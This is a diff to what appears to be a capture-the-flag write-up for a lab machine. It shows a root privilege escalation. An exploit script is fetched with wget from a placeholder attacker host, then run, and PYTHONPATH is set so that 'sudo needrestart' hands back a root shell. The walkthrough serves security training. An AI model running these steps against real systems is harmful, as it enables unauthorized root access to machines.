@@ -416,15 +416,64 @@ Then, back on the victim machine we run `wget` to download the `autoRun.sh` file
 ```
 
 ```
-fismathack@conversor:/tmp$ wget http://<attacker ip>:8000/runner.sh
---2025-11-03 01:31:55--  http://<attacker ip>:8000/runner.sh
+fismathack@conversor:/tmp$ wget http://<attacker ip>:8000/autoRun.sh
+--2025-11-03 01:31:55--  http://<attacker ip>:8000/autoRun.sh
 Connecting to <attacker ip>:8000... connected.
 HTTP request sent, awaiting response... 200 OK
 Length: 451 [application/x-sh]
-Saving to: ‘runner.sh’
+Saving to: ‘autoRun.sh’
 
-runner.sh                        100%[=========================================================>]     451  --.-KB/s    in 0s      
+autoRun.sh                        100%[=========================================================>]     451  --.-KB/s    in 0s      
 
-2025-11-03 01:31:55 (22.8 MB/s) - ‘runner.sh’ saved [451/451]
+2025-11-03 01:31:55 (22.8 MB/s) - ‘autoRun.sh’ saved [451/451]
 ```
 
+We then alter file permissions to allow for file execution and execute.
+
+```
+fismathack@conversor:/tmp$ chmod +x autoRun.sh
+fismathack@conversor:/tmp$ ./autoRun.sh
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100 15520  100 15520    0     0   154k      0 --:--:-- --:--:-- --:--:--  156k
+Bait process is running. Trigger 'sudo /usr/sbin/needrestart' in another shell.
+```
+
+Before executing `needrestart` some prerequisites need to be satisfied. The `PYTHONPATH` needs to be adjusted 
+
+```
+fismathack@conversor:/tmp$ cd rce
+fismathack@conversor:/tmp/rce$ export PYTHONPATH="/tmp/rce"
+fismathack@conversor:/tmp/rce$ python3 e.py
+```
+
+With the python script running in the background we can ssh into `10.10.11.92` again in a seperate terminal and run `needrestart`
+
+```
+fismathack@conversor:~$ sudo /usr/sbin/needrestart
+Scanning processes...                                                           
+Scanning linux images...                                                        
+
+Running kernel seems to be up-to-date.
+
+No services need to be restarted.
+
+No containers need to be restarted.
+
+No user sessions are running outdated binaries.
+
+No VM guests are running outdated hypervisor (qemu) binaries on this host.
+```
+
+Back on the main terminal the script executes and allows for a root shell.
+
+```
+Shell received
+# 
+# cd /root
+# ls
+root.txt  scripts
+# cat root.txt
+<root flag will be here>
+# 
+```
